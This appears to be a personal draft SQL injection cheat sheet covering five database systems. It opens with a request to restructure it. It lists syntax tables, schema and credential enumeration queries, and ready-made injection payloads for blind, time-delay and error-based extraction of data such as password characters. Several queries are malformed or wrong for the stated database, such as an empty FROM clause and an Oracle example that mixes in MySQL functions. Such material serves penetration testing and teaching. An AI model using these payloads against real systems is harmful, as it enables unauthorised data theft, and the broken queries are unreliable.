---
created: 2026-04-18
sticker: lucide//syringe
---

Take the following SQLi cheat sheet and restructure, transform it to create the best huge and comprehensive SQLi cheatsheet.
Please, make sure every single statement and query in the cheatsheet is correct and valid. Change as needed.
Complete the cheatsheet so it is comprehensive, exhaustive for these five DBMS: 
- MySQL
- MSSQL
- PostgreSQL
- Oracle
- SQLite
Main goal: convenient, usable, huge cheatsheet. Repetitions may exist.

Structure and plan:
- Tables with the same meaning for different databases
- DBMS-specific references
## Syntax reference

### Comments

| DBMS           | Inline comment                             | Block comment   |
| -------------- | ------------------------------------------ | --------------- |
| **MySQL**      | `-- comment` (space needed)<br>`# comment` | `/* comment */` |
| **MSSQL**      | `--comment`                                | `/* comment */` |
| **PostgreSQL** | `--comment`                                | `/* comment */` |
| **Oracle**     | `--comment`                                | `/* comment */` |
| **SQLite**     | `--comment`                                | `/* comment */` |

>[!tip]+ Use `-- -` for comments
>- In MySQL,  `--` starts a comment only if it’s followed by a space or control character. 
>- `--comment` (no space) is **not** treated as comment. 
>- The `-- -` pattern guarantees a space and prevents the application from stripping trailing whitespaces. Safe to use universally.

### Statement terminators & stacking

| DBMS           | Terminator | Stacked queries supported?                                                           |
| -------------- | ---------- | ------------------------------------------------------------------------------------ |
| **MySQL**      | `;`        | Yes (`mysqli` extension in PHP, if enabled).                                         |
| **MSSQL**      | `;`        | Yes                                                                                  |
| **PostgreSQL** | `;`        | Yes                                                                                  |
| **Oracle**     | `;`        | No (but possible in some older versions (`8i` to `11g R2`) and in PL/SQL injection). |
| **SQLite**     | `;`        | Yes                                                                                  |
### String operations
#### Concatenation

| DBMS           | Syntax                                                                                                       |
| -------------- | ------------------------------------------------------------------------------------------------------------ |
| **MySQL**      | `SELECT 'str' 'ing';` *(space)*<br>`SELECT CONCAT('str', 'ing');` ·<br>`SELECT CONCAT_WS('', 'str', 'ing');` |
| **MSSQL**      | `SELECT 'str' + 'ing';` ·<br>`SELECT CONCAT('str', 'ing');` ·<br>`SELECT CONCAT_WS('', 'str', 'ing');`       |
| **PostgreSQL** | `SELECT 'str' \|\| 'ing';` ·<br>`SELECT CONCAT('str', 'ing');` ·<br>`SELECT CONCAT_WS('', 'str', 'ing');`    |
| **Oracle**     | `SELECT 'str' \|\| 'ing';` ·<br>`SELECT CONCAT('str', 'ing');` (2 arguments only)                            |
| **SQLite**     | `SELECT 'str' \|\| 'ing';`                                                                                   |

>[!note]+ `CONCAT()` vs. `CONCAT_WS()`
> 
> - `CONCAT('~','str','ing')` → `~string`.
> - `CONCAT_WS('~','st','ri', 'ng')` → `st~ri~ng` (the first argument is a separator; `NULL` are skipped).
#### Substrings

| DBMS           | Syntax                                      | Example                                       |
| -------------- | ------------------------------------------- | --------------------------------------------- |
| **MySQL**      | `SUBSTRING(<string>, <position>, <length>)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **MSSQL**      | `SUBSTRING(<string>, <position>, <length>)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **PostgreSQL** | `SUBSTRING(<string>, <position>, <length>)` | `SELECT SUBSTRING('string', 3, 4);` -> `ring` |
| **Oracle**     | `SUBSTR(<string>, <position>, <length>)`    | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |
| **SQLite**     | `SUBSTR(<string>, <position>, <length>)`    | `SELECT SUBSTR('string', 3, 4);` -> `ring`    |
>[!note] All these functions use **`1`-based** indexing. Position `1` = first character (not `0` like in C).
#### Length 

| DBMS           | Syntax                                                                                                    |
| -------------- | --------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT LENGTH('string');` ·<br>`SELECT CHAR_LENGTH('string');`                                           |
| **MSSQL**      | `SELECT LEN('string');` ·<br>`SELECT DATALENGTH('string');`                                               |
| **PostgreSQL** | `SELECT LENGTH('string');` ·<br>`SELECT CHAR_LENGTH('string');` ·<br>`SELECT CHARACTER_LENGTH('string');` |
| **Oracle**     | `SELECT LENGTH('string') FROM dual;` · <br>`SELECT LENGTHB('string') FROM dual;`                          |
| **SQLite**     | `SELECT LENGTH('string');`                                                                                |

>[!note]+ MySQL `LENGTH()` vs. `CHAR_LENGTH()`
>- `LENGTH()` calculates bytes; `CHAR_LENGTH()` calculates characters.

>[!note]+ MSSQL `LEN()` vs. `DATALENGTH()`
>- [`LEN()`](https://www.w3schools.com/sql/func_sqlserver_len.asp) calculates characters, but no *trailing* spaces (e.g., `LEN('string ')` returns 6).
>- [`DATALENGTH()`](https://www.w3schools.com/sql/func_sqlserver_datalength.asp) calculates bytes, and includes trailing spaces (e.g., `DATALENGTH('string ')` returns 7).

### Numeric & type conversion

- Casting:

| DBMS           | Syntax                                          | Example                                      |
| -------------- | ----------------------------------------------- | -------------------------------------------- |
| **MySQL**      | `CAST(expr AS type)` ·<br>`CONVERT(expr, type)` | `CAST('5' AS UNSIGNED)`                      |
| **MSSQL**      | `CAST(expr AS type)` ·<br>`CONVERT(type, expr)` | `CAST('5' AS INT)` · <br>`CONVERT(INT, '5')` |
| **PostgreSQL** | `CAST(expr AS type)` ·<br>`expr::type`          | `CAST('5' AS INTEGER)` · <br>`'5'::int`      |
| **Oracle**     | `CAST(expr AS type)` ·<br>`TO_NUMBER(expr)`     | `CAST('5' AS NUMBER)` · <br>`TO_NUMBER('5')` |
| **SQLite**     | `CAST(expr AS type)`                            | `CAST('5' AS INTEGER)`                       |
- Type names:

| DBMS           | Integer                               | Text/String                     | Float     |
| -------------- | ------------------------------------- | ------------------------------- | --------- |
| **MySQL**      | `UNSIGNED` · <br>`SIGNED` · <br>`INT` | `CHAR` · <br>`CHAR(n)`          | `DECIMAL` |
| **MSSQL**      | `INT` · <br>`BIGINT`                  | `VARCHAR(n)` ·<br>`NVARCHAR(n)` | `FLOAT`   |
| **PostgreSQL** | `INTEGER` · <br>`BIGINT`              | `TEXT` · <br>`VARCHAR(n)`       | `FLOAT`   |
| **Oracle**     | `NUMBER` · <br>`INTEGER`              | `VARCHAR2(n)` · <br>`CHAR(n)`   | `NUMBER`  |
| **SQLite**     | `INTEGER`                             | `TEXT`                          | `REAL`    |
### Pattern matching

- `LIKE` wildcards:

| Wildcard | Meaning          | Example                             |
| -------- | ---------------- | ----------------------------------- |
| `%`      | Any sequence     | `WHERE name LIKE 'ad%'` → `admin`   |
| `_`      | Single character | `WHERE name LIKE 'a_min'` → `admin` |

- Case-sensitivity:

| DBMS           | Case-sensitive?                                                           |
| -------------- | ------------------------------------------------------------------------- |
| **MySQL**      | No — case-**insensitive** (depends on collation).                         |
| **MSSQL**      | Depends on collation.                                                     |
| **PostgreSQL** | Yes — case-**sensitive** (`ILIKE` for case-insensitive).                  |
| **Oracle**     | Yes — case-**sensitive** (use `UPPER()` for case-insensitive).            |
| **SQLite**     | Depends — case-**insensitive** for ASCII; case-**sensitive** for Unicode. |

- `REGEXP` / `RLIKE`:

| DBMS           | Syntax                                             | Notes                                        |
| -------------- | -------------------------------------------------- | -------------------------------------------- |
| **MySQL**      | `str REGEXP 'pattern'` · <br>`str RLIKE 'pattern'` | POSIX ERE                                    |
| **MSSQL**      | — _(no native regex; use `CLR` or `LIKE`)_         |                                              |
| **PostgreSQL** | `str ~ 'pattern'` ·<br>`str ~* 'pattern'`          | `~` = case-sensitive; <br>`~*` = insensitive |
| **Oracle**     | `REGEXP_LIKE(str, 'pattern')`                      | POSIX ERE                                    |
| **SQLite**     | — _(requires user-defined functions)_              |                                              |
>[!example]+
> ```SQL
> -- MySQL: check if first char of password is in [a-f]
> ' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) REGEXP '^[a-f]'-- -
> 
> -- PostgreSQL
> ' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) ~ '^[a-f]'-- -
> 
> -- Oracle
> ' AND REGEXP_LIKE((SELECT password FROM users WHERE ROWNUM=1),'^[a-f]','i')-- -
> ```

### Conditions

| DBMS           | Conditional              |
| -------------- | ------------------------ |
| **MySQL**      | `CASE WHEN` ·<br>`IF()`  |
| **MSSQL**      | `CASE WHEN` ·<br>`IIF()` |
| **PostgreSQL** | `CASE WHEN`              |
| **Oracle**     | `CASE WHEN`              |
| **SQLite**     | `CASE WHEN` ·<br>`IIF()` |

#### `CASE WHEN`

>[!note] `CASE WHEN` is supported by all five DBMS.

- **Syntax**:

```sql
CASE WHEN <condition> THEN <true_value> ELSE <false_value> END
```

>[!example]+
> - MySQL / MSSQL / PostgreSQL / SQLite / Oracle (after version `23c`):
> 
> ```SQL
> SELECT CASE WHEN 1=1 THEN 'yes' ELSE 'no' END
> ```
> 
> - Oracle (before version `23c`):
> 
> ```SQL
> SELECT CASE WHEN 1=1 THEN 'yes' ELSE 'no' END FROM dual
> ```
> - Injection:
> ```SQL
> (SELECT CASE WHEN LENGTH(database())=4 THEN TO_CHAR(1/0) ELSE '' END FROM dual)
> ```

#### `IF()` — MySQL

- **Syntax**:

```SQL
IF(<condition>, <value_if_true>, <value_if_false>)
```

> [!example]+
> ```SQL
> SELECT IF(1=1, 'true', 'false')
> ```
> 
> - Injection:
> 
> ```SQL
> ' AND IF(1=1, SLEEP(5), 0)-- -
> ```
> ```SQL
> IF(SUBSTR(password,1,1)='a', 1/0, 1) -- -
> ```
> 
> 

#### `IIF()` — MSSQL / SQLite

- **Syntax**:

```SQL
IIF(<condition>, <value_if_true>, <value_if_false>)
```

>[!example]+
> ```sql
> SELECT IIF(1=1, 'true', 'false')
> ```

### Time delay functions

| DBMS           | Syntax                                                                                       | Example (~10-second delay)                                                                              |
| -------------- | -------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SLEEP(seconds)` ·<br>`BENCHMARK(count, expression)`                                         | `SLEEP(10)`<br>`BENCHMARK(50000000, MD5('test'))`                                                       |
| **MSSQL**      | `WAITFOR DELAY 'hh:mm:ss'`                                                                   | `WAITFOR DELAY '0:0:10'`                                                                                |
| **PostgreSQL** | `pg_sleep(seconds)`                                                                          | `pg_sleep(10)`                                                                                          |
| **Oracle**     | `DBMS_PIPE.RECEIVE_MESSAGE('a', seconds)`<br>`DBMS_LOCK.SLEEP(seconds)` *(needs privileges)* | `DBMS_PIPE.RECEIVE_MESSAGE('a',10)`<br>`DBMS_LOCK.SLEEP(10)`                                            |
| **SQLite**     | — *(no native sleep; use heavy query)*                                                       | `WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<10000000) SELECT count(*) FROM r` |

>[!example]+ 
> - MySQL:
> 
> ```sql
> '; SELECT SLEEP(10)-- -
> ' AND SLEEP(10)-- -
> ' AND IF(1=1, SLEEP(10), 0)-- -
> ```
> 
> - MSSQL:
> 
> ```SQL
> '; WAITFOR DELAY '0:0:10'-- -
> ' IF(1=1) WAITFOR DELAY '0:0:10'-- -
> ```
> 
> - PostgreSQL:
> 
> ```SQL
> '; SELECT pg_sleep(10)-- -
> ' AND 1=(SELECT 1 FROM pg_sleep(10))-- -
> ```
> 
> - Oracle:
> 
> ```SQL
> ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)-- -
> ```
> 
## Enumerating schema
### Database version

| DBMS           | Query                                                                                                                 |
| -------------- | --------------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT VERSION();` ·<br>`SELECT @@version;` ·<br>`SELECT @@global.version;`                                          |
| **MSSQL**      | `SELECT @@VERSION;`                                                                                                   |
| **PostgreSQL** | `SELECT version()` ·<br>`SHOW server_version`                                                                         |
| **Oracle**     | `SELECT banner FROM v$version;` ·<br>`SELECT version FROM v$instance;` ·<br>`SELECT * FROM v$version WHERE ROWNUM=1;` |
| **SQLite**     | `SELECT sqlite_version();`                                                                                            |

### Current database / schema

| DBMS           | Query                                                                                                                                                                           |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT DATABASE();` ·<br>`SELECT SCHEMA();`                                                                                                                                    |
| **MSSQL**      | `SELECT DB_NAME();` ·<br>`SELECT DB_NAME(DB_ID());`                                                                                                                             |
| **PostgreSQL** | `SELECT current_database();` ·<br>`SELECT CURRENT_CATALOG;`                                                                                                                     |
| **Oracle**     | `SELECT name FROM v$database;` ·<br>`SELECT ora_database_name FROM dual;` ·<br>`SELECT sys_context('USERENV','DB_NAME') FROM dual;` ·<br>`SELECT global_name FROM global_name;` |
| **SQLite**     | `PRAGMA database_list;`                                                                                                                                                         |

### Listing databases / schemas

| DBMS           | Query                                                                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT schema_name FROM information_schema.schemata;` ·<br>`SHOW DATABASES;`                                                                                                                              |
| **MSSQL**      | `SELECT name FROM master..sysdatabases;` ·<br>`SELECT name FROM sys.databases;`                                                                                                                            |
| **PostgreSQL** | `SELECT datname FROM pg_database;` ·<br>`SELECT catalog_name FROM;` ·<br>`information_schema.information_schema_catalog_name;`                                                                             |
| **Oracle**     | `SELECT name FROM v$database;` ·<br>`SELECT db_unique_name FROM v$database;` ·<br>*(Oracle is typically a single-database server; schemas = users)*<br>`SELECT username FROM all_users ORDER BY username;` |
| **SQLite**     | `PRAGMA database_list;`                                                                                                                                                                                    |

### Listing tables

| DBMS           | Query                                                                                                                                                                     |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();` ·<br>`SHOW TABLES;`                                                                     |
| **MSSQL**      | `SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';` ·<br>`SELECT name FROM sysobjects WHERE xtype='U';` ·<br>`SELECT name FROM sys.tables;` |
| **PostgreSQL** | `SELECT tablename FROM pg_tables WHERE schemaname='public';` ·<br>`SELECT table_name FROM information_schema.tables WHERE table_schema=current_database();`               |
| **Oracle**     | `SELECT table_name FROM user_tables;` ·<br>`SELECT table_name FROM all_tables WHERE owner='SCHEMA_NAME';` ·<br>`SELECT table_name FROM dba_tables;`                       |
| **SQLite**     | `SELECT name FROM sqlite_master WHERE type='table';` ·<br>`SELECT name FROM sqlite_schema WHERE type='table';`                                                            |
### Listing columns

| DBMS           | Query                                                                                                                                                                             |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';` ·<br>`SHOW COLUMNS FROM users;` ·<br>`DESCRIBE users;`                                  |
| **MSSQL**      | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';` ·<br>`SELECT name, system_type_id FROM sys.columns WHERE object_id=OBJECT_ID('users');` |
| **PostgreSQL** | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';`                                                                                         |
| **Oracle**     | `SELECT column_name, data_type FROM all_columns WHERE table_name='USERS';` ·<br>`SELECT column_name, data_type FROM user_tab_columns WHERE table_name='USERS';`                   |
| **SQLite**     | `SELECT name, type FROM pragma_table_info('users');` ·<br>`PRAGMA table_info(users);`                                                                                             |
>[!note] Table names in Oracle data dictionary are **UPPERCASE** by default.
### Current user

| DBMS           | Query                                                                                                     |
| -------------- | --------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT USER();` ·<br>`SELECT CURRENT_USER();` ·<br>`SELECT SYSTEM_USER();` ·<br>`SELECT SESSION_USER();` |
| **MSSQL**      | `SELECT SYSTEM_USER;` ·<br>`SELECT USER_NAME();` ·<br>`SELECT SUSER_SNAME()`                              |
| **PostgreSQL** | `SELECT current_user;` ·<br>`SELECT user;` ·<br>`SELECT session_user;`                                    |
| **Oracle**     | `SELECT USER FROM dual;` ·<br>`SELECT sys_context('USERENV','SESSION_USER') FROM dual;`                   |
| **SQLite**     | — *(SQLite has no user concept)*                                                                          |

### Hostname / server

| DBMS           | Query                                                                                                          |
| -------------- | -------------------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT @@hostname;` ·<br>`SELECT @@datadir;`                                                                  |
| **MSSQL**      | `SELECT @@SERVERNAME;` ·<br>`SELECT HOST_NAME();`                                                              |
| **PostgreSQL** | `SELECT inet_server_addr();` ·<br>`SELECT current_setting('listen_addresses');`                                |
| **Oracle**     | `SELECT sys_context('USERENV','HOST') FROM dual;` ·<br>`SELECT sys_context('USERENV','IP_ADDRESS') FROM dual;` |
| **SQLite**     | — _(N/A)_                                                                                                      |

### Listing stored procedures / functions

| DBMS           | Query                                                                                              |
| -------------- | -------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT routine_name, routine_type FROM information_schema.routines;`                              |
| **MSSQL**      | `SELECT name FROM sys.procedures;` ·<br>`SELECT name FROM sys.objects WHERE type IN ('P','FN');`   |
| **PostgreSQL** | `SELECT routine_name FROM information_schema.routines WHERE routine_type='FUNCTION';`              |
| **Oracle**     | `SELECT object_name, object_type FROM user_objects WHERE object_type IN ('PROCEDURE','FUNCTION');` |
| **SQLite**     | — _(SQLite has no stored procedures)_                                                              |
### Extracting data with pagination (blind/`UNION`)

| DBMS           | Get nth row                                                                                           |
| -------------- | ----------------------------------------------------------------------------------------------------- |
| **MySQL**      | `SELECT col FROM tbl LIMIT n-1,1;`<br>or <br>`LIMIT 1 OFFSET n-1;`                                    |
| **MSSQL**      | `SELECT col FROM tbl ORDER BY col OFFSET n-1 ROWS FETCH NEXT 1 ROWS ONLY;`                            |
| **MSSQL**      | `SELECT TOP 1 col FROM tbl WHERE col NOT IN (SELECT TOP n-1 col FROM tbl ORDER BY col) ORDER BY col;` |
| **PostgreSQL** | `SELECT col FROM tbl LIMIT 1 OFFSET n-1;`                                                             |
| **Oracle**     | `SELECT col FROM (SELECT col, ROWNUM rn FROM tbl) WHERE rn=n;`                                        |
| **SQLite**     | `SELECT col FROM tbl LIMIT 1 OFFSET n-1;`                                                             |

##  References and further reading

- `PortSwigger`
	- https://portswigger.net/web-security/sql-injection/cheat-sheet
- `invicti`
	- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
- github
	- https://github.com/payloadbox/sql-injection-payload-list
	- https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
	- https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet
- `sqlzoo`
	- https://sqlzoo.net/wiki/SQL_Tutorial


